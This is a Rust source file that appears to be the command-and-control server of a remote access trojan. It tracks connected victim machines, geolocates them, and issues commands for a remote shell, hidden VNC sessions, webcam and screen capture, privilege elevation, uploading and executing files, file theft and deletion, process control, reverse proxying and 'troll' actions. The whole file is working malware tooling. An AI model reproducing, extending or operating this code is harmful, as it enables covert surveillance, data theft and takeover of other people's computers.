use tauri::{AppHandle, Emitter};

use std::collections::HashMap;
use tokio::sync::mpsc::{Receiver, Sender};
use std::net::SocketAddr;

use std::sync::{ Arc, Mutex };

use rsa::{RsaPrivateKey, RsaPublicKey};
use rsa::pkcs8::EncodePublicKey;
use rsa::rand_core::OsRng;
use base64::{engine::general_purpose, Engine as _};

use common::packets::*;
use anyhow::{Context, Result};
use crate::commands::*;
use common::RSA_BITS;

use crate::utils::logger::Logger;
use crate::utils::encryption::{handle_encryption_request, handle_encryption_confirm};
use common::client_info::ClientInfo;

pub struct ServerWrapper {
    receiver: Receiver<ServerCommand>,
    txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
    connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
    priv_key: RsaPrivateKey,
    pub_key: RsaPublicKey,
    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
    reverse_proxy_tasks: HashMap<std::net::SocketAddr, tokio::task::JoinHandle<()>>,
    log_events: Logger,
    country_reader: maxminddb::Reader<Vec<u8>>,
}

impl ServerWrapper {
    pub async fn spawn(receiver: Receiver<ServerCommand>) -> Result<()> {
        let txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>> = HashMap::new();
        let connected_users: HashMap<std::net::SocketAddr, ClientInfo> = HashMap::new();
        let mut rng = OsRng;
        let priv_key =
            RsaPrivateKey::new(&mut rng, RSA_BITS).with_context(|| "Failed to generate a key.")?;
        let pub_key = RsaPublicKey::from(&priv_key);

        let country_reader = maxminddb::Reader::open_readfile("Country.mmdb").unwrap();

        let s = Self {
            receiver,
            txs,
            connected_users,
            priv_key,
            pub_key,
            tauri_handle: None,
            reverse_proxy_tasks: HashMap::new(),
            log_events: Logger::new(),
            country_reader,
        };

        s.channel_loop().await;

        Ok(())
    }

    // Helper method for common command logging and execution
    async fn handle_command(&mut self, addr: &SocketAddr, packet: ClientboundPacket) {
        println!("Handling command: {:?}", packet.get_type());
        println!("Packet: {:?}", packet);
        if let Some(client) = self.connected_users.get(addr) {
            self.log_events
                .log(
                    "cmd_sent",
                    format!(
                        "Executed {} on client [{}] [{}]",
                        packet.get_type(),
                        addr,
                        client.system.username
                    ),
                )
                .await;
            self.send_client_packet(addr, packet.clone()).await;
        }
    }

    // Helper method for handling client data responses
    async fn handle_client_data(
        &mut self,
        addr: &SocketAddr,
        data_type: &str,
        event: &str,
        payload: serde_json::Value,
    ) {
        if let Some(client) = self.connected_users.get(addr) {
            self.log_events
                .log(
                    "cmd_rcvd",
                    format!(
                        "Received {} from client [{}] [{}]",
                        data_type, addr, client.system.username
                    ),
                )
                .await;
            self.emit_serde_payload(event, payload).await;
        }
    }

    async fn emit_client_status(&self, client_info: &ClientInfo, status: &str) {
        let payload = serde_json::json!(client_info);
        self.emit_serde_payload(status, payload).await;
    }

    async fn emit_serde_payload(&self, event: &str, payload: serde_json::Value) {
        if let Some(handle) = &self.tauri_handle {
            handle
                .lock()
                .unwrap()
                .emit(event, payload)
                .unwrap_or_else(|e| println!("Failed to emit payload event: {}", e));
        } else {
            println!("Cannot send payload event: Tauri handle not set");
        }
    }

    async fn send_client_packet(&self, addr: &SocketAddr, packet: ClientboundPacket) {
        if let Some(tx) = self.txs.get(addr) {
            tx.send(ClientCommand::Write(packet.clone()))
                .await
                .unwrap_or_else(|e| {
                    println!("Failed to send packet {:?}: {}", packet.get_type(), e)
                });
        }
    }

    async fn get_country_code(&self, addr: &SocketAddr) -> String {
        let country = self
            .country_reader
            .lookup::<maxminddb::geoip2::Country>(addr.ip())
            .unwrap();
        if let Some(country) = country {
            country.country.unwrap().iso_code.unwrap().to_string()
        } else {
            "N/A".to_string()
        }
    }

    async fn channel_loop(mut self) {
        while let Some(p) = self.receiver.recv().await {
            use crate::commands::ServerCommand::*;

            match p {
                // Infrastructure and logging
                Log(log) => self.log_events.log_once(log).await,

                CloseClientSessions() => {
                    for (addr, tx) in self.txs.iter_mut() {
                        tx.send(ClientCommand::Close).await.unwrap();
                        self.reverse_proxy_tasks.remove(&addr);
                    }
                    self.txs.clear();
                    self.connected_users.clear();
                    self.reverse_proxy_tasks.clear();
                    self.log_events
                        .log("server_stopped", "Server stopped!".to_string())
                        .await;
                }

                SetTauriHandle(handle) => {
                    self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
                    self.log_events.tauri_handle = Some(self.tauri_handle.clone().unwrap());
                }

                // Client connection handling
                EncryptionRequest(tx, otx) => {
                    handle_encryption_request(
                        tx,
                        otx,
                        self.pub_key.to_public_key_der().unwrap().as_ref().to_vec(),
                    )
                    .await;
                }

                EncryptionConfirm(tx, otx, enc_s, enc_t, exp_t) => {
                    handle_encryption_confirm(tx, otx, enc_s, enc_t, exp_t, self.priv_key.clone())
                        .await;
                }

                RegisterClient(tx, addr, mut client_info) => {
                    self.txs.insert(addr, tx);
                    client_info.data.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
                    client_info.data.addr = Some(addr.to_string());
                    client_info.data.country_code = self.get_country_code(&addr).await;
                    
                    self.connected_users.insert(addr, client_info.clone());

                    self.log_events
                        .log(
                            "client_connected",
                            format!("Client [{}] {} connected!", addr, client_info.system.username),
                        )
                        .await;
                    self.emit_client_status(&client_info, "client_connected")
                        .await;
                }

                ClientDisconnected(addr) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "client_disconnected",
                                format!("Client [{}] [{}] disconnected", addr, client.system.username),
                            )
                            .await;
                        self.emit_client_status(&client, "client_disconnected")
                            .await;
                    }

                    let tx = self.txs.get(&addr);

                    if let Some(tx) = tx {
                        tx.send(ClientCommand::Close).await.unwrap();
                    }

                    self.txs.remove(&addr);
                    self.reverse_proxy_tasks.remove(&addr);
                    self.connected_users.remove(&addr);
                }

                // Client actions - simplified using generic command handler
                VisitWebsite(addr, data) => {
                    self.handle_command(&addr, ClientboundPacket::VisitWebsite(data))
                        .await
                }

                ShowMessageBox(addr, data) => {
                    self.handle_command(&addr, ClientboundPacket::ShowMessageBox(data))
                        .await
                }

                ShowInputBox(addr, data) => {
                    self.handle_command(&addr, ClientboundPacket::ShowInputBox(data))
                        .await;
                }

                InputBoxResult(addr, result) => {
                    if let Some(_client) = self.connected_users.get(&addr) {
                        self.emit_serde_payload("inputbox_result", serde_json::json!({
                            "addr": addr.to_string(),
                            "result": result
                        })).await;
                    }
                }

                ElevateClient(addr) => {
                    self.handle_command(&addr, ClientboundPacket::ElevateClient)
                        .await
                }

                TakeScreenshot(addr, display) => {
                    self.handle_command(&addr, ClientboundPacket::ScreenshotDisplay(display))
                        .await
                }

                GetProcessList(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetProcessList)
                        .await
                }

                KillProcess(addr, process) => {
                    self.handle_command(&addr, ClientboundPacket::KillProcess(process))
                        .await
                }

                SuspendProcess(addr, process) => {
                    self.handle_command(&addr, ClientboundPacket::SuspendProcess(process))
                        .await
                }

                ResumeProcess(addr, process) => {
                    self.handle_command(&addr, ClientboundPacket::ResumeProcess(process))
                        .await
                }

                StartProcess(addr, process) => {
                    self.handle_command(&addr, ClientboundPacket::StartProcess(process))
                        .await
                }

                StartShell(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StartShell)
                        .await
                }

                ExitShell(addr) => {
                    self.handle_command(&addr, ClientboundPacket::ExitShell)
                        .await
                }

                ShellCommand(addr, command) => {
                    self.handle_command(&addr, ClientboundPacket::ShellCommand(command))
                        .await
                }

                StartRemoteDesktop(addr, config) => {
                    self.handle_command(&addr, ClientboundPacket::StartRemoteDesktop(config))
                        .await
                }

                StopRemoteDesktop(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopRemoteDesktop)
                        .await;
                    // Reset input state
                    let reset_input = KeyboardInputData {
                        key_code: 0,
                        character: "".to_string(),
                        is_keydown: false,
                        shift_pressed: false,
                        ctrl_pressed: false,
                        caps_lock: false,
                    };
                    self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(reset_input))
                        .await;
                }

                RequestWebcam(addr) => {
                    self.handle_command(&addr, ClientboundPacket::RequestWebcam)
                        .await
                }

                ManageSystem(addr, command) => {
                    self.handle_command(&addr, ClientboundPacket::ManageSystem(command.clone()))
                        .await
                }

                DownloadFile(addr, path) => {
                    self.handle_command(&addr, ClientboundPacket::DownloadFile(path))
                        .await
                }

                // Simple commands without logging
                MouseClick(addr, data) => {
                    self.send_client_packet(&addr, ClientboundPacket::MouseClick(data))
                        .await
                }
                KeyboardInput(addr, data) => {
                    self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(data))
                        .await
                }
                PreviousDir(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::PreviousDir)
                        .await
                }
                ViewDir(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::ViewDir(path))
                        .await
                }
                AvailableDisks(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::AvailableDisks)
                        .await
                }
                RemoveDir(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::RemoveDir(path))
                        .await
                }
                RemoveFile(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::RemoveFile(path))
                        .await
                }
                DisconnectClient(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::Disconnect)
                        .await
                }
                ReconnectClient(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::Reconnect)
                        .await
                }

                StartHVNC(addr) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events.log("cmd_sent", format!("Starting HVNC on client [{}] [{}]", addr, client.system.username)).await;
                        self.send_client_packet(&addr, ClientboundPacket::StartHVNC).await  
                    }
                }
                StopHVNC(addr) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events.log("cmd_sent", format!("Stopping HVNC on client [{}] [{}]", addr, client.system.username)).await;
                        self.send_client_packet(&addr, ClientboundPacket::StopHVNC).await  
                    }
                }
                OpenExplorer(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::OpenExplorer)
                        .await
                }

                UploadAndExecute(addr, file_data) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events.log("cmd_sent", format!("Uploading and executing file {} to client [{}] [{}]", file_data.name, addr, client.system.username)).await;
                        self.send_client_packet(&addr, ClientboundPacket::UploadAndExecute(file_data)).await;
                    }
                },
                
                ExecuteFile(addr, path) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events.log("cmd_sent", format!("Executing file {} on client [{}] [{}]", path, addr, client.system.username)).await;
                        self.send_client_packet(&addr, ClientboundPacket::ExecuteFile(path)).await;
                    }
                },
                
                UploadFile(addr, target_folder, file_data) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events.log("cmd_sent", format!("Uploading file {} to folder {} on client [{}] [{}]", file_data.name, target_folder, addr, client.system.username)).await;
                        self.send_client_packet(&addr, ClientboundPacket::UploadFile(target_folder, file_data)).await;
                    }
                },

                HVNCFrame(addr, data) => {
                    println!("HVNCFrame received from {}", addr);
                    self.emit_serde_payload("hvnc_frame", serde_json::json!({
                        "addr": addr.to_string(),
                        "data": general_purpose::STANDARD.encode(&data)
                    })).await;
                },

                // Client data responses - consolidated pattern
                ScreenshotData(addr, data) => {
                    if let Some(_client) = self.connected_users.get(&addr) {
                        self.emit_serde_payload(
                            "client_screenshot",
                            serde_json::json!({
                                "addr": addr.to_string(),
                                "data": format!("data:image/jpeg;base64,{}", general_purpose::STANDARD.encode(&data.data))
                            }),
                        ).await;
                    }
                }

                ProcessList(addr, process_list) => {
                    self.handle_client_data(
                        &addr,
                        "process list",
                        "process_list",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "processes": process_list.processes.clone()
                        }),
                    )
                    .await;
                }

                ShellOutput(addr, output) => {
                    self.handle_client_data(
                        &addr,
                        "shell output",
                        "client_shellout",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "shell_output": output.clone()
                        }),
                    )
                    .await;
                }

                RemoteDesktopFrame(addr, frame) => {
                    self.emit_serde_payload(
                        "remote_desktop_frame",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "timestamp": frame.timestamp,
                            "display": frame.display,
                            "data": general_purpose::STANDARD.encode(&frame.data),
                        }),
                    ).await;
                }
                

                WebcamResult(addr, frame) => {
                    if let Ok(jpeg_data) = crate::utils::webcam::process_webcam_frame(frame) {
                        self.emit_serde_payload(
                            "webcam_result",
                            serde_json::json!({
                                "addr": addr.to_string(),
                                "data": format!("data:image/jpeg;base64,{}", general_purpose::STANDARD.encode(&jpeg_data)),
                            }),
                        ).await;
                    }
                }

                FileList(addr, files) => {
                    self.emit_serde_payload(
                        "files_result",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "files": files
                        }),
                    )
                    .await;
                }

                CurrentFolder(addr, path) => {
                    self.emit_serde_payload(
                        "current_folder",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "path": path
                        }),
                    )
                    .await;
                }

                DisksResult(addr, disks) => {
                    let files = disks
                        .iter()
                        .map(|disk| File {
                            file_type: "dir".to_string(),
                            name: format!("{}:\\", disk),
                        })
                        .collect::<Vec<_>>();

                    self.emit_serde_payload(
                        "files_result",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "files": files
                        }),
                    )
                    .await;
                }

                DownloadFileResult(addr, file_data) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "cmd_rcvd",
                                format!(
                                    "Downloaded file from client [{}] [{}]",
                                    addr, client.system.username
                                ),
                            )
                            .await;
                        let _ = std::fs::write(file_data.name, file_data.data);
                    }
                }

                // Utilities
                GetClients(resp) => {
                    resp.send(self.connected_users.values().cloned().collect())
                        .ok();
                }

                GetClient(addr, resp) => {
                    resp.send(self.connected_users.get(&addr).cloned()).ok();
                }

                // Reverse proxy handling
                StartReverseProxy(addr, port, local_port) => {
                    self.handle_command(&addr, ClientboundPacket::StartReverseProxy(port.clone()))
                        .await;
                    if let Some(task) =
                        crate::utils::reverse_proxy::start_reverse_proxy(port, local_port).await
                    {
                        self.reverse_proxy_tasks.insert(addr, task);
                    }
                }

                StopReverseProxy(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopReverseProxy)
                        .await;
                    if let Some(task) = self.reverse_proxy_tasks.get(&addr) {
                        task.abort();
                    }
                    self.reverse_proxy_tasks.remove(&addr);
                }

                HandleTroll(addr, command) => {
                    self.handle_command(&addr, ClientboundPacket::TrollClient(command))
                        .await;
                }


            }
        }
    }
}
